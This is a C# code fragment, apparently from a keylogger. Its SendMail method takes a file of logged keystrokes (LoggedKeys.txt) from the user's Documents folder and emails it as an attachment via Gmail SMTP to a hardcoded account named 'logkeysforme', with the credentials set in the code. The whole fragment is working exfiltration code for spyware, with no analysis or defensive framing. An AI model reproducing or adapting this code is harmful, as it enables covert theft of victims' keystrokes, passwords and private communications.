    static void SendMail()
    {
        String Newfilepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string Newfilepath2 = Newfilepath + @"\LogsFolder\LoggedKeys.txt";
        DateTime dateTime = DateTime.Now;
        string subtext = "Loggedfiles";
        subtext += dateTime;
        using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587))
        {
            MailMessage LOGMESSAGE = new MailMessage();
            LOGMESSAGE.From = new MailAddress("logkeysforme@gmail.com");
            LOGMESSAGE.To.Add("logkeysforme@gmail.com");
            LOGMESSAGE.Subject = subtext;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("logkeysforme@gmail.com", "password");
            System.Threading.Thread.Sleep(2);
            using (var attachment = new Attachment(Newfilepath2))
            {
                LOGMESSAGE.Attachments.Add(attachment);
                LOGMESSAGE.Body = subtext;
                client.Send(LOGMESSAGE);
            }
        }
    }
